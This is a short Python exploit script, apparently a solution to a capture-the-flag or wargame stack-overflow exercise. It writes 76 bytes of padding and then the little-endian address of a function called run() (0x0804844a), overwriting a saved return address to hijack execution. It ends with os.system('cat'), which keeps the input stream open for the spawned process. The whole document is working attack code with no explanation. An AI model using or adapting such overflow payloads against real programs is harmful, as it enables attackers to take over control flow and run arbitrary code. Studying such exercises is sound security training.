import sys
import os

offset = '*' * 76

# address of run() -> 0x0804844a
run = '\x08\x04\x84\x4a'[::-1]

payload = run

sys.stdout.write(offset + payload)
sys.stdout.flush()

os.system('cat')